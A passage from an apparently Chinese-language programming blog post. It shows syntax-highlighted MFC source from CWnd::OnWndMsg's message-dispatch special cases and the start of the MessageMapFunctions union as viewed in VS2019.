keyword\">delete</span> m_pDynamicLayout<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>\t\t\tm_pDynamicLayout <span class=\"token operator\">=</span> <span class=\"token constant\">NULL</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre>\t\t<span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre>\t\t<span class=\"token keyword\">else</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre>\t\t<span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre>\t\t\t<span class=\"token function\">InitDynamicLayout</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"30\"></td><td><pre>\t\t<span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"31\"></td><td><pre>\t<span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"32\"></td><td><pre></pre></td></tr><tr><td data-num=\"33\"></td><td><pre>\t<span class=\"token comment\">// special case for notifies</span></pre></td></tr><tr><td data-num=\"34\"></td><td><pre>\t<span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>message <span class=\"token operator\">==</span> WM_NOTIFY<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"35\"></td><td><pre>\t<span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"36\"></td><td><pre>\t\tNMHDR<span class=\"token operator\">*</span> pNMHDR <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span>NMHDR<span class=\"token operator\">*</span><span class=\"token punctuation\">)</span>lParam<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"37\"></td><td><pre>\t\t<span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>pNMHDR<span class=\"token operator\">-></span>hwndFrom <span class=\"token operator\">!=</span> <span class=\"token constant\">NULL</span> <span class=\"token operator\">&amp;&amp;</span> <span class=\"token function\">OnNotify</span><span class=\"token punctuation\">(</span>wParam<span class=\"token punctuation\">,</span> lParam<span class=\"token punctuation\">,</span> <span class=\"token operator\">&amp;</span>lResult<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"38\"></td><td><pre>\t\t\t<span class=\"token keyword\">goto</span> LReturnTrue<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"39\"></td><td><pre>\t\t<span class=\"token keyword\">return</span> FALSE<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"40\"></td><td><pre>\t<span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"41\"></td><td><pre></pre></td></tr><tr><td data-num=\"42\"></td><td><pre>\t<span class=\"token comment\">// special case for activation</span></pre></td></tr><tr><td data-num=\"43\"></td><td><pre>\t<span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>message <span class=\"token operator\">==</span> WM_ACTIVATE<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"44\"></td><td><pre>\t\t<span class=\"token function\">_AfxHandleActivate</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">this</span><span class=\"token punctuation\">,</span> wParam<span class=\"token punctuation\">,</span> <span class=\"token class-name\">CWnd</span><span class=\"token operator\">::</span><span class=\"token function\">FromHandle</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span>HWND<span class=\"token punctuation\">)</span>lParam<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"45\"></td><td><pre></pre></td></tr><tr><td data-num=\"46\"></td><td><pre>\t<span class=\"token comment\">// special case for set cursor HTERROR</span></pre></td></tr><tr><td data-num=\"47\"></td><td><pre>\t<span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>message <span class=\"token operator\">==</span> WM_SETCURSOR <span class=\"token operator\">&amp;&amp;</span></pre></td></tr><tr><td data-num=\"48\"></td><td><pre>\t\t<span class=\"token function\">_AfxHandleSetCursor</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">this</span><span class=\"token punctuation\">,</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">short</span><span class=\"token punctuation\">)</span><span class=\"token function\">LOWORD</span><span class=\"token punctuation\">(</span>lParam<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> <span class=\"token function\">HIWORD</span><span class=\"token punctuation\">(</span>lParam<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"49\"></td><td><pre>\t<span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"50\"></td><td><pre>\t\tlResult <span class=\"token operator\">=</span> <span class=\"token number\">1</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"51\"></td><td><pre>\t\t<span class=\"token keyword\">goto</span> LReturnTrue<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"52\"></td><td><pre>\t<span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"53\"></td><td><pre></pre></td></tr><tr><td data-num=\"54\"></td><td><pre>   <span class=\"token comment\">// special case for windows that contain windowless ActiveX controls</span></pre></td></tr><tr><td data-num=\"55\"></td><td><pre>   BOOL bHandled<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"56\"></td><td><pre></pre></td></tr><tr><td data-num=\"57\"></td><td><pre>   bHandled <span class=\"token operator\">=</span> FALSE<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"58\"></td><td><pre>   <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span>m_pCtrlCont <span class=\"token operator\">!=</span> <span class=\"token constant\">NULL</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">&amp;&amp;</span> <span class=\"token punctuation\">(</span>m_pCtrlCont<span class=\"token operator\">-></span>m_nWindowlessControls <span class=\"token operator\">></span> <span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"59\"></td><td><pre>   <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"60\"></td><td><pre>\t  <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span>message <span class=\"token operator\">>=</span> WM_MOUSEFIRST<span class=\"token punctuation\">)</span> <span class=\"token operator\">&amp;&amp;</span> <span class=\"token punctuation\">(</span>message <span class=\"token operator\">&lt;=</span> AFX_WM_MOUSELAST<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">||</span></pre></td></tr><tr><td data-num=\"61\"></td><td><pre>\t\t <span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span>message <span class=\"token operator\">>=</span> WM_KEYFIRST<span class=\"token punctuation\">)</span> <span class=\"token operator\">&amp;&amp;</span> <span class=\"token punctuation\">(</span>message <span class=\"token operator\">&lt;=</span> WM_IME_KEYLAST<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">||</span></pre></td></tr><tr><td data-num=\"62\"></td><td><pre>\t\t <span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span>message <span class=\"token operator\">>=</span> WM_IME_SETCONTEXT<span class=\"token punctuation\">)</span> <span class=\"token operator\">&amp;&amp;</span> <span class=\"token punctuation\">(</span>message <span class=\"token operator\">&lt;=</span> WM_IME_KEYUP<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"63\"></td><td><pre>\t  <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"64\"></td><td><pre>\t\t bHandled <span class=\"token operator\">=</span> m_pCtrlCont<span class=\"token operator\">-></span><span class=\"token function\">HandleWindowlessMessage</span><span class=\"token punctuation\">(</span>message<span class=\"token punctuation\">,</span> wParam<span class=\"token punctuation\">,</span> lParam<span class=\"token punctuation\">,</span> <span class=\"token operator\">&amp;</span>lResult<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"65\"></td><td><pre>\t  <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"66\"></td><td><pre>   <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"67\"></td><td><pre>   <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>bHandled<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"68\"></td><td><pre>   <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"69\"></td><td><pre>\t  <span class=\"token keyword\">goto</span> LReturnTrue<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"70\"></td><td><pre>   <span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><p>注意联合体  <code>MessageMapFunctions</code> ，这是我在 VS2019 中查看的定义：</p>\n<figure class=\"highlight cpp\"><figcaption data-lang=\"C++\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">union</span> MessageMapFunctions</pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>\tAFX_PMSG pfn<span class=\"token punctuation\">;</span>   <span class=\"token comment\">// generic member function pointer</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>\t<span class=\"token function\">BOOL</span> <span class=\"token punctuation\">(</span>AFX_MSG_CALL CCmdTarget<span class=\"token operator\">::</span><span class=\"token operator\">*</span>pfn_b_D<span class=\"token punctuation\">)</span><span class=\"token punctuation\">(</span>CDC<span class=\"token operator\">*</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>\t<span class=\"token function\">BOOL</span> <span class=\"token punctuation\">(</span>AFX_MSG_CALL CCmdTarget<span class=\"token operator\">::</span><span class=\"token operator\">*</span>pfn_b_b<span class=\"token punctuation\">)</span><span class=\"token punctuation\">(</span>BOOL<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>\t<span class=\"token function\">BOOL</span> <span class=\"token punctuation\">(</span>AFX_MSG_CALL CCmdTarget<span class=\"token operator\">::</span><span class=\"token operator\">*</span>pfn_b_u<span class=\"token punctuation\">)</span><span class=\"token punctuation\">(</span>UINT<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>\t<span class=\"token function\">BOOL</span> <span class=\"token punctuation\">(</span>AFX_MSG_CALL CCmdTarget<span class=\"token operator\">::</span><span class=\"token operator\">*</span>pfn_b_h<span class=\"token punctuation\">)</span><span class=\"token punctuation\">(</span>HANDLE<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>\t<span class=\"token function\">BOOL</span> <span class=\"token punctuation\">(</span>AFX_MSG_CALL CCmdTarget<span class=\"token operator\">::</span><span class=\"token operator\">*</span>pfn_b_W_u_u<span class=\"token punctuation\">)</span><span class=\"token punctuation\">(</span>CWnd<span class=\"token operator\">*</span><span class=\"token punctuation\">,</span> UINT<span class=\"token punctuation\">,</span> UINT<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>\t<span class=\"token function\">BOOL</span> <span class=\"token punctuation\">(</span>AFX_MSG_CALL CCmdTarget<span class=\"token operator\">::</span><span class=\"token operator\">*</span>pfn_b_W_COPYDATASTRUCT<span class=\"token punctuation\">)</span><span class=\"token punctuation\">(</span>CWnd<span class=\"token operator\">*</span><span class=\"token punctuation\">,</span> COPYDATASTRUCT<span class=\"token operator\">*</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>\t<span class=\"token function\">BOOL</span> <span class=\"token punctuation\">(</span>AFX_MSG_CALL CCmdTarget<span class=\"token operator\">::</span><span class=\"token operator\">*</span>pfn_b_HELPINFO<span class=\"token punctuation\">)</span><span class=\"token punctuation\">(</span>LPHELPINFO<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>\t<span class=\"token function\">HBRUSH</span> <span class=\"token punctuation\">(</span>AFX_MSG_CALL CCmdTarget<span class=\"token operator\">::</span><span class=\"token operator\">*</span>pfn_B_D_W_u<span class=\"token punctuation\">)</span><span class=\"token punctuation\">(</span>CDC<span class=\"token operator\">*</span><span class=\"token punctuation\">,</span> CWnd<span class=\"token operator\">*</span><span class=\"token punctuation\">,</span> UINT<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>\t<span class=\"token function\">HBRUSH</span> <span class=\"token punctuation\">(</span>AFX_MSG_CALL CCmdTarget<span class=\"token operator\">::</span><span class=\"token operator\">*</span>pfn_B_D_u<span class=\"token punctuation\">)</span><span class=\"token punctuation\">(</span>CDC<span class=\"token operator\">*</span><span class=\"token punctuation\">,</span> UINT<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>\t<span class=\"token keyword\">int</span> <span class=\"token punctuation\">(</span>AFX_MSG_CALL CCmdTarget<span class=\"token operator\">::</span><span class=\"token operator\">*</span>pfn_i_u_W_u<span class=\"token punctuation\">)</span><span class=\"token punctuation\">(</span>UINT<span class=\"token punctuation\">,</span> CWnd<span class=\"token operator\">*</span><span class=\"token punctuation\">,</span> UINT<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>\t<span class=\"token keyword\">int</span> <span class=\"token punctuation\">(</span>AFX_MSG_CALL CCmdTarget<span class=\"token operator\">::</span><span class=\"token operator\">*</span>pfn_i_u_u<span class=\"token punctuation\">)</span><span class=\"token punctuation\">(</span>UINT<span class=\"token punctuation\">,</span> UINT<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>\t<span class=\"token keyword\">int</span> <span class=\"token punctuation\">(</span>AFX_MSG_CALL CCmdTarget<span class=\"token operator\">::</span><span class=\"token operator\">*</span>pfn_i_W_u_u<span class=\"token punctuation\">)</span><span class=\"token punctuation\">(</span>CWnd<span class=\"token operator\">*</span><span class=\"token punctuation\">,</span> UINT<span class=\"token punctuation\">,</span> UINT<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>\t<span class=\"token keyword\">int</span> <span class=\"token punctuation\">(</span>AFX_MSG_CALL CWnd<span class=\"token operator\">::</span><span class=\"token operator\">*</span>pfn_i_s<span class=\"token punctuation\">)</span><span class=\"token punctuation\">(</span>LPTSTR<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>\t<span class=\"token keyword\">int</span> <span class=\"token punctuation\">(</span>AFX_MSG_CALL CWnd<span class=\"token operator\">::</span><span class=\"token operator\">*</span>pfn_i_S<span class=\"token punctuation\">)</span><span class=\"token punctuation\">(</span>LPCTSTR<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>\t<span class=\"token function\">LRESULT</span> <span class=\"token punctuation\">(</span>AFX_MSG_CALL CWnd<span class=\"token operator\">::</span><span class=\"token operator\">*</span>pfn_l_w_l<span class=\"token punctuation\">)</span><span class=\"token punctuation\">(</span>WPARAM<span class=\"token punctuation\">,</span> LPARAM<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>\t<span class=\"token function\">LRESULT</span> <span class=\"token punctuation\">(</span>AFX_MSG_CALL CWnd<span class=\"token operator\">::</span><span class=\"token operator\">*</span>pfn_l_u_u_M<span class=\"token punctuation\">)</span><span class=\"token punctuation\">(</span>UINT<span class=\"token punctuation\">,</span> UINT<span class=\"token punctuation\">,</span> CMenu<span class=\"token operator\">*</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>\t<span class=\"token keyword\">void</span> <span class=\"token punctuation\">(</span>AFX_MSG_CALL CWnd<span class=\"token operator\">::</span><span class=\"token operator\">*</span>pfn_v_b_h<span class=\"token punctuation\">)</span><span class=\"token punctuation\">(</span>BOOL<span class=\"token punctuation\">,</span> HANDLE<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>\t<span class=\"token keyword\">void</span> <span class=\"token punctuation\">(</span>AFX_MSG_CALL CWnd<span class=\"token operator\">::</span><span class=\"token operator\">*</span>pfn_v_h<span class=\"token punctuation\">)</span><span class=\"token punctuation\">(</span>HANDLE<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>\t<span class=\"token keyword\">void</span> <span class=\"token punctuation\">(</span>AFX_MSG_CALL CWnd<span class=\"token operator\">::</span><span class=\"token operator\">*</span>pfn_v_h_h<span class=\"token punctuation\">)</span><span class=\"token punctuation\">(</span>HANDLE<span class=\"token punctuation\">,</span>HANDLE<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>\t<span class=\"token keyword\">void</span> <span class=\"token punctuation\">(</span>AFX_MSG_CALL CWnd<span class=\"token operator\">::</span><span class=\"token operator\">*</span>pfn_v_v<span class=\"token punctuation\">)</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>\t<span class=\"token keyword\">int</span> <span class=\"token punctuation\">(</span>AFX_MSG_CALL CWnd<span class=\"token operator\">::</span><span class=\"token operator\">*</span>pfn_i_u<span class=\"token punctuation\">)</span><span class=\"token punctuation\">(</span>UINT<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre>\t<span class=\"token function\">HCURSOR</span> <span class=\"token punctuation\">(</span>AFX_MSG_CALL CWnd<span class=\"token operator\">::</span><span class=\"token operator\">*</span>pfn_C_v<span class=\"token punctuation\">)</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre>\t<span class=\"token function\">UINT</span> <span class=\"token punctuation\">(</span>AFX_MSG_CALL CWnd<span class=\"token operator\">::</span><span class=\"token operator\">*</span>pfn_u_u<span class=\"token punctuation\">)</span><span class=\"token punctuation\">(</span>UINT<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre>\t<span class=\"token function\">BOOL</span> <span class=\"token punctuation\">(</span>AFX_MSG_CALL CWnd<span class=\"token operator\">::</span><span class=\"token operator\">*</span>pfn_b_v<span class=\"token punctuation\">)</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre>\t<span class=\"token keyword\">void</span> <span class=\"token punctuation\">(</span>AFX_MSG_CALL CWnd<span class=\"token operator\">::</span><span class=\"token operator\">*</span>pfn_v_u<span class=\"token punctuation\">)</span><span class=\"token punctuation\">(</span>UINT<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"30\"></td><td><pre>\t<span class=\"token keyword\">void</span> <span class=\"token punctuation\">(</span>AFX_MSG_CALL CWnd<span class=\"token operator\">::</span><span class=\"token operator\">*</span>pfn_v_up<span class=\"token punctuation\">)</span><span class=\"token punctuation\">(</span>UINT_PTR<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"31\"></td><td><pre>\t<span class=\"token keyword\">void</span> <span class=\"token punctuation\">(</span>AFX_MSG_CALL CWnd<span class=\"token operator\">::</span><span class=\"token operator\">*</span>pfn_v_u_u<span class=\"token punctuation\">)</span><span class=\"token punctuation\">(</span>UINT<span class=\"token punctuation\">,</span> UINT<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"32\"></td><td><pre>\t<span class=\"token keyword\">void</span> <span class=\"token punctuation\">(</span>AFX_MSG_CALL CWnd<span class=\"token operator\">::</span><span class=\"token operator\">*</span>pfn_v_i_i<span class=\"token punctuation\">)</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span><span class=\"token punctuation\">,</span> <span class=\"token keyword\">int</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"33\"></td><td><pre>\t<span class=\"token keyword\">void</span> <span class=\"token punctuation\">(</span>AFX_MSG_CALL CWnd<span class=\"token operator\">::</span><span class=\"token operator\">*</span>pfn_v_u_u_u<span class=\"token punctuation\">)</span><span class=\"token punctuation\">(</span>UINT<span class=\"token punctuation\">,</span> UINT<span class=\"token punctuation\">,</span> UINT<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"34\"></td><td><pre>\t<span class=\"token keyword\">void</span> <span class=\"token punctuation\">(</span>AFX_MSG_CALL CWnd<span class=\"token operator\">::</span><span class=\"token operator\">*</span>pfn_v_u_i_i<span class=\"token punctuation\">)</span><span class=\"token punctuation\">(</span>UINT<span class=\"token punctuation\">,</span> <span class=\"token keyword\">int</span><span class=\"token punctuation\">,</span> <span class=\"token keyword\">int</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"35\"></td><td><pre>\t<span class=\"token keyword\">void</span> <span class=\"token punctuation\">(</span>AFX_MSG_CALL CWnd<span class=\"token operator\">::</span><span class=\"token operator\">*</span>pfn_v_w_l<span class=\"token punctuation\">)</span><span class=\"token punctuation\">(</span>WPARAM<span class=\"token punctuation\">,</span> LPARAM<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"36\"></td><td><pre>\t<span class=\"token keyword\">void</span> <span class=\"token punctuation\">(</span>AFX_MSG_CALL CWnd<span class=\"token operator\">::</span><span class=\"token operator\">*</span>pfn_v_b_W_W<span class=\"token punctuation\">)</span><span class=\"token punctuation\">(</span>BOOL<span class=\"token punctuation\">,</span> CWnd<span class=\"token operator\">*</span><span class=\"token punctuation\">,</span> CWnd<span class=\"token operator\">*</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"37\"></td><td><pre>\t<span class=\"token keyword\">void</span> <span class=\"token punctuation\">(</span>AFX_MSG_CALL CWnd<span class=\"token operator\">::</span><span class=\"token operator\">*</span>pfn_v_D<span class=\"token punctuation\">)</span><span class=\"token punctuation\">(</span>CDC<span class=\"token operator\">*</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"38\"></td><td><pre>\t<span class=\"token keyword\">void</span> <span class=\"token punctuation\">(</span>AFX_MSG_CALL CWnd<span class=\"token operator\">::</span><span class=\"token operator\">*</span>pfn_v_M<span class=\"token punctuation\">)</span><span class=\"token punctuation\">(</span>CMenu<span class=\"token operator\">*</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"39\"></td><td><pre>\t<span class=\"token keyword\">void</span> <span class=\"token punctuation\">(</span>AFX_MSG_CALL CWnd<span class=\"token operator\">::</span><span class=\"token operator\">*</span>pfn_v_M_u_b<span class=\"token punctuation\">)</span><span class=\"token punctuation\">(</span>CMenu<span class=\"token operator\">*</span><span class=\"token punctuation\">,</span> UINT<span class=\"token punctuation\">,</span> BOOL<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"40\"></td><td><pre>\t<span class=\"token keyword\">void</span> <span class=\"token punctuation\">(</span>AFX_MSG_CALL CWnd<span class=\"token operator\">::</span><span class=\"token operator\">*</span>pfn_v_W<span class=\"token punctuation\">)</span><span class=\"token punctuation\">(</span>CWnd<span class=\"token operator\">*</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"41\"></td><td><pre>\t<span class=\"token keyword\">void</span> <span class=\"token punctuation\">(</span>AFX_MSG_CALL CWnd<span class=\"token operator\">::</span><span class=\"token operator\">*</span>pfn_v_W_u_u<span class=\"token punctuation\">)</span><span class=\"token punctuation\">(</span>CWnd<span class=\"token operator\">*</span><span class=\"token punctuation\">,</span> UINT<span class=\"token punctuation\">,</span> UINT<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"42\"></td><td><pre>\t<span class=\"token keyword\">void</span> <span class=\"token punctuation\">(</span>AFX_MSG_CALL CWnd<span class=\"token operator\">::</span><span class=\"token operator\">*</span>pfn_v_W_p<span class=\"token punctuation\">)</span><span class=\"token punctuation\">(</span>CWnd<span class=\"token operator\">*</span><span class=\"token punctuation\">,</span> CPoint<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"43\"></td><td><pre>\t<span class=\"token keyword\">void</span> <span class=\"token punctuation\">(</span>AFX_MSG_CALL CWnd<span class=\"token operator\">::</span><span class=\"token operator\">*</span>pfn_v_W_h<span class=\"token punctuation\">)</span><span class=\"token punctuation\">(</span>CWnd<span class=\"token operator\">*</span><span class=\"token punctuation\">,</span> HANDLE<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"44\"></td><td><pre>\t<span class=\"token keyword\">void</span> <span class=\"token punctuation\">(</span>AFX_MSG_CALL CWnd<span class=\"token operator\">::</span><span class=\"token operator\">*</span>pfn_v_u_W<span class=\"token punctuation\">)</span><span class=\"token punctuation\">(</span>UINT<span class=\"token punctuation\">,</span> CWnd<span class=\"token operator\">*</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"45\"></td><td><pre>\t<span class=\"token keyword\">void</span> <span class=\"token punctuation\">(</span>AFX_MSG_CALL CWnd<span class=\"token operator\">::</span><span class=\"token operator\">*</span>pfn_v_u_W_b<span class=\"token punctuation\">)</span><span class=\"token punctuation\">(</span>UINT<span class=\"token punctuation\">,</span> CWnd<span class=\"token operator\">*</span><span class=\"token punctuation\">,</span> BOOL<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"46\"></td><td><pre>\t<span class=\"token keyword\">void</span> <span class=\"token punctuation\">(</span>AFX_MSG_CALL CWnd<span class=\"token operator\">::</span><span class=\"token operator\">*</span>pfn_v_u_u_W<span class=\"token punctuation\">)</span><span class=\"token punctuation\">(</span>UINT<span class=\"token punctuation\">,</span> UINT<span class=\"token punctuation\">,</span> CWnd<span class=\"token operator\">*</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"47\"></td><td><pre>\t<span class=\"token keyword\">void</span> <span class=\"token punctuation\">(</span>AFX_MSG_CALL CWnd<span class=\"token operator\">::</span><span class=\"token operator\">*</span>pfn_v_s<span class=\"token punctuation\">)</span><span class=\"token punctuation\">(</span>LPTSTR<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"48\"></td><td><pre>\t<span class=\"token keyword\">void</span> <span class=\"token punctuation\">(</span>AFX_MSG_CALL CWnd<span class=\"token operator\">::</span><span class=\"token operator\">*</span>pfn_v_u_cs<span class=\"token punctuation\">)</span><span class=\"token punctuation\">(</span>UINT<span class=\"token punctuation\">,</span> LPCTSTR<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"49\"></td><td><pre>\t<span class=\"token keyword\">void</span> <span class=\"token punctuation\">(</span>AFX_MSG_CALL CWnd<span class=\"token operator\">::</span><span class=\"token operator\">*</span>pfn_v_i_s<span class=\"token punctuation\">)</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span><span class=\"token punctuation\">,</span> LPTSTR<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"50\"></td><td><pre>\t<span class=\"token keyword\">int</span> <span class=\"token punctuation\">(</span>AFX_MSG_CALL CWnd<span class=\"token operator\">::</span><span class=\"token operator\">*</span>pfn_i_i_s<span class=\"token punctuation\">)</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span><span class=\"token punctuation\">,</span> LPTSTR<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"51\"></td><td><pre>\t<span class=\"token function\">UINT</span> <span class=\"token punctuation\">(</span>AFX_MSG_CALL CWnd<span class=\"token operator\">::</span><span class=\"token operator\">*</span>pfn_u_p<span class=\"token punctuation\">)</span><span class=\"token punctuation\">(</span>CPoint<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"52\"></td><td><pre>\t<span class=\"token function\">LRESULT</span> <span class=\"token punctuation\">(</span>AFX_MSG_CALL CWnd<span class=\"token operator\">::</span><span class=\"token operator\">*</span>pfn_l_p<span class=\"token punctuation\">)</span><span class=\"token punctuation\">(</span>CPoint<span 